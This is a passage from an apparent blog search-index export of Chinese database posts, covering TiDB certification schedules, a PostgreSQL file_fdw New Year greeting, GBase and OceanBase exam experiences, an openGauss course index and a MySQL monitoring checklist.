<li><s><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/720003" >PCTA 认证考试（2022-02-17） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></s></li>
<li><s><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/720005" >PCTA 认证考试（2022-03-03） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></s></li>
<li><s><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/660003" >PCTA 认证考试（2022-03-17） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></s></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/720006" >PCTA 认证考试（2022-03-31） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
</li>
<li><a class="link"   href="https://learn.pingcap.com/learner/exam-market/list?category=PCTP" >PCTP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
<ul>
<li><s><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/840001" >PCTP 认证考试（2022-02-23） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></s></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/870001" >PCTP 认证考试（2022-03-23） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
</li>
</ul>
<blockquote>
<p>2022-03-22</p>
</blockquote>
<p>2022年<strong>第二季度</strong>考试计划时间：</p>
<ul>
<li><a class="link"   href="https://learn.pingcap.com/learner/exam-market/list?category=PCTA" >PCTA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
<ul>
<li><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/1020003" >PCTA 认证考试（2022-04-14） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/1020002" >PCTA 认证考试（2022-04-28） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/1050002" >PCTA 认证考试（2022-05-12） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/1080001" >PCTA 认证考试（2022-05-26） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/1050001" >PCTA 认证考试（2022-06-09） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/1020001" >PCTA 认证考试（2022-06-23） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
</li>
<li><a class="link"   href="https://learn.pingcap.com/learner/exam-market/list?category=PCTP" >PCTP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
<ul>
<li><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/1110002" >PCTP 认证考试（2022-04-20） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/1020004" >PCTP 认证考试（2022-05-18） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/exam-market/detail/1170001" >PCTP 认证考试（2022-06-15） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
</li>
</ul>
<h2 id="PCTP-思维导图">PCTP 思维导图</h2>
<p>笔者在学习过程中整理的思维导图，在此分享出来，希望可以对大家的学习有所帮助。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/tidb/pingcap-cert-pctp/tidb-arch-mind.png"
                      alt="TiDB数据库体系结构.png" loading="lazy"
                ></p>
<h2 id="相关链接">相关链接</h2>
<ul>
<li><a class="link"   href="https://learn.pingcap.com/learner/certification-center/syllabus/pcta" >PCTA考试大纲 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/certification-center/syllabus/pctp" >PCTP考试大纲 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/course/120005" >302 TiDB 高级系统管理 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/" >官方文档 - TiDB 简介 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://asktug.com/t/topic/303174" >【课程上新】系统学习 TiDB，成为 TiDB 数据库专家，有它就够了！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://asktug.com/t/topic/513371" >【考试指南】PCTA&amp;PCTP 在线考试操作指南 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://asktug.com/t/topic/513290" >【考试指南】如何获得 PCTP 认证考试兑换码？ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2022/tidb/pingcap-cert-pcta/">TiDB 认证 | PCTA 认证需要掌握的知识点</a></li>
</ul>
<p>最后，恭喜考试通过拿到证书的同学，也祝那些带有些许失望的同学下次一定顺利通过！</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/242972" >https://www.modb.pro/db/242972 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tidb.net/blog/ea7a1acb?shareId=d13bb5e5" >https://tidb.net/blog/ea7a1acb?shareId=d13bb5e5 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>Education</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>pingcap</tag>
        <tag>pcta</tag>
        <tag>pingcap认证</tag>
        <tag>pctp</tag>
      </tags>
  </entry>
  <entry>
    <title>新年🏮集【福】咯</title>
    <url>/2022/modb/modb-new-year-fu/</url>
    <content><![CDATA[<p>墨天轮新年活动—— <a class="link"   href="https://www.modb.pro/db/233434" >新年SQL“祝福”大赛 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，投稿参与一下，SQL水平功底薄弱，只好用别的方法找补，总不能交白卷不是。</p>
<p>过程简述：</p>
<ol>
<li>使用本地PostgreSQL作为基础环境</li>
<li>以静态图转ascii文本</li>
<li>将文本文件作为外部表，创建file_fdw，并关联外部文件</li>
</ol>
<p>过程演示：</p>
<ol>
<li>本地数据库版本：</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">postgres# <span class="keyword">select</span> version();</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                 version                                                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> PostgreSQL <span class="number">12.4</span> <span class="keyword">on</span> x86_64<span class="operator">-</span>pc<span class="operator">-</span>linux<span class="operator">-</span>gnu, compiled <span class="keyword">by</span> gcc (GCC) <span class="number">4.8</span><span class="number">.5</span> <span class="number">20150623</span> (Red Hat <span class="number">4.8</span><span class="number">.5</span><span class="number">-36</span>), <span class="number">64</span><span class="operator">-</span>bit <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>静态图</li>
</ol>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/modb/modb-new-year-fu/fu1.jpg"
                      alt="fu1.jpg" loading="lazy"
                ></p>
<ol start="3">
<li>创建file_fdw</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> EXTENSION file_fdw;</span><br><span class="line"><span class="keyword">CREATE</span> SERVER file_fdw_server <span class="keyword">FOREIGN</span> DATA WRAPPER file_fdw;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FOREIGN</span> <span class="keyword">TABLE</span> fu(fu text) server file_fdw_server options</span><br><span class="line"> (format <span class="string">&#x27;text&#x27;</span>,filename <span class="string">&#x27;/tmp/fu.sql&#x27;</span>,delimiter <span class="string">&#x27;,&#x27;</span>,<span class="keyword">null</span> <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
<ol start="4">
<li>查询【福】表（<code>fu</code>）</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> fu;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/modb/modb-new-year-fu/fu2.jpg"
                      alt="fu2.jpg" loading="lazy"
                ></p>
<hr>
<p>略显单调，但祝福的意愿满满。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/237415" >https://www.modb.pro/db/237415 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>墨天轮</category>
      </categories>
      <tags>
        <tag>墨天轮</tag>
        <tag>postgres</tag>
        <tag>postgres_fdw</tag>
      </tags>
  </entry>
  <entry>
    <title>资深 DBA 带您了解 GBase 培训</title>
    <url>/2021/gbase-8a-gdca/</url>
    <content><![CDATA[<p>2021年是“十四五”的开局之年，是信创产业人才大力培养重点发力的一年，国产数据库从“百花齐放”进阶到加速发展的阶段。南大通用，是国内唯一一家专注于数据库产品研发，并且在金融、电信行业得到规模化应用的独立数据库服务商。我作为一名从业多年的 DBA，在“信创”大旗的指引下，深觉应该多多了解国产数据库，接触使用国产数据库，尤其是 GBase 这样优秀的产品。机缘巧合在朋友的推荐下，我参加了 GBase 8s 认证培训（2021年11月）。GBase 8s 是南大通用自主研发的、成熟稳定的企业级事物型数据库，拥有自主知识产权。经过近一个月的培训，GBase 8s 培训营顺利结营，老师们精彩、细致的讲解给人留下了非常深刻的印象。于是在看到今年最后一期 GBase 8a MPP Cluster（以下简称8a集群）数据库训练营的招生计划时，我便在第一时间联系培训中心的老师报名参加，以期更多更全面的了解南大通用 GBase 数据库。</p>
<p>在 “GBase 8s” 培训结束之后，继续参加了 “GBase 8a集群” 的培训课程，并于圣诞节这天参加 GDCA 认证考试，顺利完成了为期18天的课程。整套培训课程结构安排合理，张弛有度，每天1~2小时的视频在线学习，可在上下班通勤时间轻松完成，每节课程都有配套习题或练习，以助加深学习印象、在实践中理解概念。虽然说是线上授课，但是同学们学习热情很高涨，有500多人共同在线学习，培训中心的沈老师和郝老师很热情，也很认真负责，每天早上发早安语，鼓励大家按时上课学习、按时交作业，也总是在第一时间在微信群里回复大家提出的各种花式问题。</p>
<p>关于课程，课程主体分为两个部分：第一部分课程为期5天，详细介绍 GBase 8a 集群的原理、组成及架构，集群安装、升级、扩容，及日常管理。参加课程的同学都在积极参与实践，动手搭建集群，在实践中学习、理解消化课程内容。下图为我本地测试环境中搭建的 GBase 8a 集群，展示的内容为集群状态、当前节点各个服务运行状态及当前运行的版本。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2021/gbase-8a-gdca/gcadmin.png"
                      alt="gcadmin" loading="lazy"
                ><br>
图1 搭建集群，导入license，查看集群状态及版本</p>
<p>课程第二部分为期7天，重点在于学习GBase 8a集群下的SQL应用。图2是我整理的整套课程的思维导图，是我对于课程的理解性输出，同时也希望对后来学习者有所提示或帮助。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2021/gbase-8a-gdca/gbase-8a-gdca.png"
                      alt="gbase-8a-gdca" loading="lazy"
                ><br>
图2 课程体系思维导图</p>
<p>今年 GBase 举办了多期培训课程及 GDCA 认证考试，主要是围绕 GBase 8a 和 GBase 8s 展开，希望明年在条件允许的情况下展开 GBase 8c 的初级认证课程。同时，今年拥有 GDCA 的人才储备基本初具规模，希望明年可以择时开放中级课程。当然，一门课程不可能是拍拍脑袋就能编写出来的，尤其是这种充满实战意味的课程，更是需要讲师的丰富经验，以及从众多客户案例中进行总结、提炼，最后反复锤炼、打磨，才能成为一门优秀的课程。希望明年可以安排一到两场活动，鼓励广大GDCAer将实战中的经验以图文方式总结输出，在总结中继续升级技能的同时，还可从活动中吸收优秀案例纳入 GBase 中级课程，或许中级课程中可以专门以此设定一个章节名为案例分析汇总。</p>
<p>再来说说 GBase 8s 和 GBase 8a 两次培训的感受，表面上是8a相比于8s更浅显易懂，8a不同章节由不同的老师讲解指导，各有特色，共同点是各位老师讲解时概念清楚、逻辑清晰。其实不然，8a比8s的考试题更倾向于学习过程中对概念的消化理解，如果上课时有溜号的情况，而课后又没认真复习，那么考试过80分都将成为挑战，更不用说挑战100分。在学习过程中，南大通用的老师专门开放了错题集功能，这样在复习时可以更有针对性的进行概念回归、知识点巩固。当然，有收获却也有遗憾，本次考试最终成绩97分，与8s、8a双100的机会失之交臂，不满足才有前进的动力，学习的旅途就是如此，寂寞与惊喜常相伴，保持持续学习的心态就好。</p>
<p>经过两次培训课程下来，使我对南大通用的产品线有了更深的了解，四朵金花之一的 GBase 名副其实，分析型8a、交易型8s、分布式交易型8c，各种应用需求场景全覆盖，好产品都是实打实、撸起袖子加油“干”出来的，相信南大通用的产品会越做越好，也相信南大通用的人才培养策略会进一步踏实落地，为国产数据库的人才力量添砖加瓦。</p>
<p>最后，再次感谢南大通用培训中心提供的这次非常好的学习与交流的机会，感谢南大通用老师们的指导。</p>
<hr>
<p>相关链接：</p>
<ul>
<li><a class="link"   href="https://www.gbase.cn/learn/certification-system" >GBase 学堂 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.gbase.cn/learn/training-activities" >GBase 8a 认证培训 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/224213" >https://www.modb.pro/db/224213 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzI2ODU2NDUzMQ==&amp;mid=2247490215&amp;idx=3&amp;sn=88a1587ba380840697e50cd7faf6c07d" >https://mp.weixin.qq.com/s?__biz=MzI2ODU2NDUzMQ==&amp;mid=2247490215&amp;idx=3&amp;sn=88a1587ba380840697e50cd7faf6c07d <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>GBase</category>
        <category>GBase 8a</category>
      </categories>
      <tags>
        <tag>gbase</tag>
        <tag>gdca</tag>
        <tag>gbase 8a</tag>
        <tag>南大通用</tag>
      </tags>
  </entry>
  <entry>
    <title>openGauss每日一练 | by 少安 | 汇总</title>
    <url>/2021/opengauss-couse-21day/</url>
    <content><![CDATA[<p>本文是每日打卡课程<a class="link"   href="https://www.modb.pro/course/133" >每日一练：openGauss数据库在线实训课程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的汇总篇，整理所有打卡文章链接，以便索引。</p>
<blockquote>
<p>2021-12-21 (已完成)</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">#</th>
<th style="text-align:left">课程&amp;链接</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">第1天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/212051" >1.1 openGauss创建表、插入记录、查询记录和删除表基本使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第2天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/212053" >2.1 openGauss查询、更新和删除基本使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第3天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/212059" >3.1 openGauss创建数据库、修改数据库属性和删除数据库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第4天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/212061" >4.1 openGauss创建角色、修改角色属性、更改角色权限和删除角色 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第5天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/212512" >5.1 openGauss创建用户、修改用户属性、更改用户权限和删除用户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第6天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/213272" >6.1 openGauss创建模式、修改模式属性和删除模式 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第7天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/213274" >7.1 openGauss表空间 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第8天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/213280" >8.1 openGauss分区表 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第9天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/213284" >9.1 openGauss普通表索引 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第10天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/213285" >10.1 openGauss分区表索引 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第11天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/214484" >11.1 openGauss视图 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第12天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/214488" >12.1 openGauss数据类型 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第13天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/214490" >13.1 openGauss导入数据 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第14天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/214492" >14.1 openGauss导出数据 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第15天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/214504" >15.1 openGauss定义存储过程和函数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第16天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/214886" >16.1 openGauss事务控制 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第17天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/214890" >17.1 openGauss定义游标 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第18天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/215831" >18.1 openGauss触发器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第19天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/216112" >19.1 openGauss收集统计信息、打印执行计划、垃圾收集和checkpoint <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第20天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/216362" >20.1 openGauss全文检索 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
<tr>
<td style="text-align:center">第21天</td>
<td style="text-align:left"><a class="link"   href="https://www.modb.pro/db/218379" >21.1 openGauss存储模型-行存和列存 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
</tr>
</tbody>
</table>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2021/opengauss-couse-21day/hello-opengauss.jpg"
                      alt="hello-opengauss.jpg" loading="lazy"
                ></p>
<hr>
<p>松鼠镇楼，按时打卡<br>
<img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2021/opengauss-couse-21day/songshu1.jpg"
                      alt="songshu1.jpg" loading="lazy"
                ></p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/212046" >https://www.modb.pro/db/212046 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>openGauss</category>
      </categories>
      <tags>
        <tag>opengauss</tag>
        <tag>course</tag>
      </tags>
  </entry>
  <entry>
    <title>OceanBase OBCP 考试经验小结</title>
    <url>/2021/oceanbase-obcp-v2-exam/</url>
    <content><![CDATA[<h2 id="考证经历">考证经历</h2>
<p>年底手头工作基本告一段落，恰好遇到恩墨做<a class="link"   href="https://www.modb.pro/db/181718" >秒杀活动 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，于是当机立断决定报名（11/30报名），然后就开始了为期12天的备考，这里说明一下，如果打算报名OBCP的小伙伴请先参加<a class="link"   href="https://www.oceanbase.com/training/detail?level=OBCA" >OBCA认证考试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，今天（12/13考试）5点起床赶路去省城参加考试（这里有点小曲折，报名之前没搞清楚有哪些考点可以选择，报考时才发现最近的考点竟然在400多公里之外）。还好，最后的结果如同计划一切完美，路途畅通、考试顺利、心情愉悦。</p>
<h2 id="考试经验">考试经验</h2>
<p>于我个人而言，这次能够顺利通过OBCP考试，最大的助力莫过于恩墨提供的完备培训资料，以及微信答疑群里李老师和各位大神的指点。</p>
<p>由于大环境所限，这次课程只能通过在线视频课程的形式学习以及自学恩墨老师重新梳理过的PPT，当然OB官网的产品资料和KB也是强烈建议学习的，官网的产品文档版本我参考的是<a class="link"   href="https://www.oceanbase.com/docs/oceanbase-database/oceanbase-database/V2.2.77/product-updates" >v2.2.77版本 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，KB不是很多大体也都翻阅了一遍。</p>
<p>在备考过程中，我认为不仅要学习理论知识，还需要在学习过程中切实动手操练，比如我在学习的过程中在本地虚拟机搭建了一个OB最小原型，将PPT里的概念转化为动手实践的结果集，边学习边实践，边学习边总结，如此才能将每个知识点理解透彻，而非留于理论字面，这也是我有信心报名、能通过考试的秘笈所在。</p>
<p>此外，在学习OceanBase的过程中，墨天轮上还有一些文章也给予我一定的启发，感兴趣的同学可以搜关键字：OceanBase、OBCP。</p>
<p>下面我将心得笔记重点部分呈现如下，以供大家参考，如若有误烦请批评指正：</p>
<table>
<thead>
<tr>
<th>课程章节</th>
<th>重点笔记</th>
</tr>
</thead>
<tbody>
<tr>
<td>1.1 OceanBase 云主机创建</td>
<td>port – 8080(OCP), 2881(OBServer), 2882(启动OBServer使用的端口), 2883(OBProxy)</td>
</tr>
<tr>
<td>1.2 OceanBase 部署环境准备</td>
<td>OceanBase容忍的集群内时钟偏差 / 保证所有节点的时钟偏差在 100ms 以内；方案：选择 OCP 服务器作为 NPT server, 其它所有 oceanbase 服务器作为 NTP client；安装介质-&gt;动手安装一遍</td>
</tr>
<tr>
<td>1.3 OceanBase 云平台安装部署</td>
<td>黑屏登录方式（用户名的几种格式）</td>
</tr>
<tr>
<td>1.4 OCP 部署 OceanBase 集群</td>
<td>分区是OceanBase数据架构的基本单元；自动负载均衡：主副本均匀打散到各个服务器中，使得各个服务器都能承载业务流量。（必须打开自动负载均衡的场景）；每个 Zone 会提供两种服务：总控服务（RootService）和分区服务（PartitionService）。（核心作用分别是）</td>
</tr>
<tr>
<td>1.5 OBproxy 配置与租户创建</td>
<td>创建租户三个步骤；相关系统表</td>
</tr>
<tr>
<td>2.1 OB 基本概念与租户创建流程</td>
<td>认真理解系统架构概念图</td>
</tr>
<tr>
<td>2.2 OB 分布式架构高级技术</td>
<td>primary zone 优先级;表组</td>
</tr>
<tr>
<td>3.1 内存管理</td>
<td>内存结构总体结构；MemStore、KVCache</td>
</tr>
<tr>
<td>3.2 内存数据落盘策略 合并与转储</td>
<td>OceanBase数据库内部IO的单位；合并触发方式、策略、机制；合并、转储对比，相关参数</td>
</tr>
<tr>
<td>4.1 SQL 请求执行流程</td>
<td>流程图；快速参数化；计划缓存</td>
</tr>
<tr>
<td>4.2 DML DDL 语言处理与查询改写</td>
<td>查询改写；改写类型</td>
</tr>
<tr>
<td>4.3 执行计划 与 执行计划缓存</td>
<td>左深树；执行计划缓存；(g)v$plan_cache_plan_explain</td>
</tr>
<tr>
<td>4.4 分区表</td>
<td>几种分区方式、限制、分区键</td>
</tr>
<tr>
<td>4.5 索引</td>
<td>路径选择；局部vs全局；主键vs分区键</td>
</tr>
<tr>
<td>4.6 Hint与SQL性能监控</td>
<td>几种用法汇总；(g)v$sql_audit</td>
</tr>
<tr>
<td>5.1 全局快照及分布式一致性读</td>
<td>GTS；全局一致性快照</td>
</tr>
<tr>
<td>5.2 分布式两阶段提交</td>
<td>与标准2PC差异、改进；宕机异常处理；分布式事务调优方法</td>
</tr>
<tr>
<td>6 OBProxy</td>
<td>核心功能；连接方式；部署方式；路由实现；常用命令、配置项</td>
</tr>
<tr>
<td>7 OB 备份与恢复</td>
<td>存储介质；备份粒度</td>
</tr>
<tr>
<td>8.1 基础参数与变量设置</td>
<td>OB系统配置项、OB系统变量(与时间相关的变量)</td>
</tr>
<tr>
<td>8.2 日常运维操作</td>
<td>服务停止；故障节点替换</td>
</tr>
<tr>
<td>8.3 数据库监控</td>
<td>集群级事件（记录集群级事件，如major freeze, 合并，server 上下线，修改primary_zone引发的切主操作、负载均衡任务执行等，保留最近7天历史）；慢SQL（查看慢日志的两种方法）；outline绑定</td>
</tr>
<tr>
<td>8.4 常见异常处理</td>
<td>合并和转储较慢，如何处理，相关配置项</td>
</tr>
<tr>
<td>8.5 灾难恢复</td>
<td>回收站（mysql/oracle模式的不同；租户级别、会话级别；清除方法）；闪回查询（mysql/oracle模式的不同）；undo_tetention</td>
</tr>
</tbody>
</table>
<p>另附成绩单一份：</p>
<img  alt="obcp-v2-exam" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20211213-c8a7c096-2898-481a-9543-c83256694c58.png"
                      referrerpolicy="no-referrer"
                >
<p>最后，感谢强大的祖国，清晨伴日升出门，傍晚天黑前回家，一天内轻松奔走800多公里路，这是我10年前上大学时不敢想象的事情。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/197751" >https://www.modb.pro/db/197751 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://enmoedu.com/portal.php?mod=view&amp;aid=58" >https://enmoedu.com/portal.php?mod=view&amp;aid=58 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://mp.weixin.qq.com/s?__biz=Mzk0OTI2NjAyMQ==&amp;mid=2247490393&amp;idx=1&amp;sn=663b7b31698182193b8c8f8992c30d6e" >2021-12-16, OBCP之路丨严少安：“12天备考拿下OBCP证书” <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>OceanBase</category>
        <category>OBCP</category>
      </categories>
      <tags>
        <tag>oceanbase</tag>
        <tag>obcp</tag>
        <tag>ob v2</tag>
        <tag>observer</tag>
        <tag>exam</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Libs</title>
    <url>/2018/python/python-libs/</url>
    <content><![CDATA[<h2 id="psutil">psutil</h2>
<ul>
<li><a class="link"   href="https://github.com/giampaolo/psutil" >https://github.com/giampaolo/psutil <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://pypi.python.org/simple/psutil/" >https://pypi.python.org/simple/psutil/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="Reference">Reference</h2>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pip</tag>
        <tag>psutil</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 监控项</title>
    <url>/2018/mysql/mysql-monitor-item/</url>
    <content><![CDATA[<p>从Server/Instance/Schema/SQL层层递进进行监控。</p>
<h2 id="Server">Server</h2>
<ul>
<li>Uptime运行时间</li>
<li>who当前用户</li>
<li>process进程</li>
<li>CPU</li>
<li>MEM</li>
<li>DISK</li>
<li>NETWORK</li>
<li>系统时间</li>
<li>系统时钟同步状态</li>
</ul>
<h2 id="Instance">Instance</h2>
<h2 id="Schema">Schema</h2>
<h2 id="SQL">SQL</h2>
<ul>
<li>CRUD操作数量统计
<ul>
<li>查询操作数量</li>
<li>更新操作数量</li>
<li>插入操作数量</li>
<li>删除操作数量</li>
<li>提交操作数量</li>
<li>回滚操作数量</li>
</ul>
</li>
<li>日志分析</li>
</ul>
<h2 id="Cluster">Cluster</h2>
<p>集群状态监控</p>
<h3 id="Master-Slave">Master-Slave</h3>
<ul>
<li>主库状态</li>
<li>从库状态</li>
<li>时延查看</li>
</ul>
